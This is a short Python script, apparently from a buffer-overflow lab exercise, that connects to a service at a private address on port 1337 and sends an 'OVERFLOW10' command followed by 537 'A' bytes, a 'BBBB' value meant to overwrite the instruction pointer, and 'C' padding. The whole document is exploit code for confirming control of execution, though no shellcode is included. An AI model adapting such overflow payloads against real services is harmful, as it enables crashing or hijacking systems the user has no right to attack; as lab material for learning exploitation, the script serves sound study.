import socket, struct

host, port = '10.10.243.3', 1337

command = b'OVERFLOW10 '
offset = 537
length = 1000
new_eip = b'BBBB'

payload  = b''.join([
command,
b'A'*offset,
new_eip,
b'C' * (length - offset - len(new_eip))



])



with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
